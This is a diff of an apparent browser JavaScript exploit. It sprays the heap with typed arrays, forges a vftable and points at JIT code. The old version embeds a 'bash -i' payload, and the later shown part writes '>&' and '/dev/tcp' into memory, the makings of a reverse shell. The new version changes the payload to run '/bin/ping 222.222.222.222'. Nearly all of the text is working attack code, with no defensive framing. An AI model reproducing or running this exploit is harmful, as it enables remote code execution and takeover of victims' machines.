@@ -1,5 +1,5 @@
 <script>	
-alert("start9");
+alert("start6");
 function func2(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -157,19 +157,24 @@ for(var i=typedarray_index;i<typedarray_index+0x40/4;i++){
 spray[spray_index][typedarray_index]=vftable;
 spray[spray_index][typedarray_index+0x30/4]=0x10000;//length
 spray[spray_index][typedarray_index+0x38/4]=jitcode_addr-0x18;//addr;
-spray[spray_index][typedarray_index+0x40/4]=0x6E69622F;
-spray[spray_index][typedarray_index+0x44/4]=0x00736c2F;
+spray[spray_index][typedarray_index+0x40/4]=0x6E69622F;// /bin/ping
+spray[spray_index][typedarray_index+0x44/4]=0x6E69702F;
+spray[spray_index][typedarray_index+0x48/4]=0x00000067;
 spray[spray_index][typedarray_index+0x60/4]=0x500000a0;
 spray[spray_index][typedarray_index+0x64/4]=0x500000b0;
-spray[spray_index][typedarray_index+0x68/4]=0x500000c0;
+spray[spray_index][typedarray_index+0x68/4]=0;//0x500000c0;
 spray[spray_index][typedarray_index+0x6c/4]=0x500000d0;
 spray[spray_index][typedarray_index+0x70/4]=0x500000f0;
 spray[spray_index][typedarray_index+0x74/4]=0x0;
 spray[spray_index][typedarray_index+0x80/4]=0x0;
 spray[spray_index][typedarray_index+0x84/4]=0x0;
-spray[spray_index][typedarray_index+0xa0/4]=0x68736162;//bash
-spray[spray_index][typedarray_index+0xa4/4]=0x0;
-spray[spray_index][typedarray_index+0xb0/4]=0x0000692d;//-i
+spray[spray_index][typedarray_index+0xa0/4]=0x6E69622F;// /bin/ping
+spray[spray_index][typedarray_index+0xa4/4]=0x6E69702F;
+spray[spray_index][typedarray_index+0xa8/4]=0x00000067;
+spray[spray_index][typedarray_index+0xb0/4]=0x2E323232;//222.222.222.222
+spray[spray_index][typedarray_index+0xb4/4]=0x2E323232;
+spray[spray_index][typedarray_index+0xb8/4]=0x2E323232;
+spray[spray_index][typedarray_index+0xbc/4]=0x00323232;
 spray[spray_index][typedarray_index+0xc0/4]=0x0000263e;//>&
 spray[spray_index][typedarray_index+0xd0/4]=0x7665642F;
 spray[spray_index][typedarray_index+0xd4/4]=0x7063742F;
